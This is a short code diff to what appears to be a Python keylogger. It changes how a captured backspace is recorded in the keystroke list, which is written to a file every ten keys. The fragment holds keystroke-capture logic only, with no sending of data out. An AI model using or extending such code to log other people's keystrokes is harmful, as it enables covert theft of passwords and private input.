@@ -9,7 +9,7 @@ def on_press(key):
     elif key == Key.enter:
         key="\n"
     elif key == Key.backspace:
-        key="\b"
+        key=" Backspace "
     keys.append(key)
     if len(keys) > 10:
         write_to_file(keys)
